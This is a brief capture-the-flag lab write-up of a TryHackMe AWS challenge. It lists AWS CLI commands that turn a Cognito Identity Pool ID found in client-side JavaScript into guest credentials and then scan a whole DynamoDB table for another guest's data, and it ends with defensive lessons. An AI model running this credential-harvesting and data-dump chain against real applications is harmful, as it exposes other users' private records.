# THM - Hacker Holidays Day 3: Complimentary
**Category:** Cloud / AWS Misconfiguration
**Difficulty:** Easy

## Tools Used
- Browser
- AWS CLI

## Steps
1. Opened the wellness app — no login required, app loaded automatically
2. Viewed page source — found reference to `app.js`
3. Opened `app.js` in browser — found hardcoded AWS Cognito Identity Pool ID
   and DynamoDB table name
4. Used AWS CLI to get a Cognito Identity ID:
   `aws cognito-identity get-id --identity-pool-id "<id>" --region us-east-1`
5. Got temporary AWS credentials using that Identity ID:
   `aws cognito-identity get-credentials-for-identity --identity-id "<id>" --region us-east-1`
6. Set credentials as environment variables:
   `export AWS_ACCESS_KEY_ID="..."`
   `export AWS_SECRET_ACCESS_KEY="..."`
   `export AWS_SESSION_TOKEN="..."`
7. Scanned the entire DynamoDB table:
   `aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1`
8. Searched output for flag using grep — found it in another guest's record

## What I Learned
- Never hardcode AWS credentials or Identity Pool IDs in client-side JavaScript
- AWS Cognito guest credentials can give access to more than just your own data
- IAM roles for unauthenticated users must be scoped to minimum permissions
- `aws dynamodb scan` dumps an entire table — always check what guest credentials can access
- Always check JavaScript files for hardcoded secrets during recon
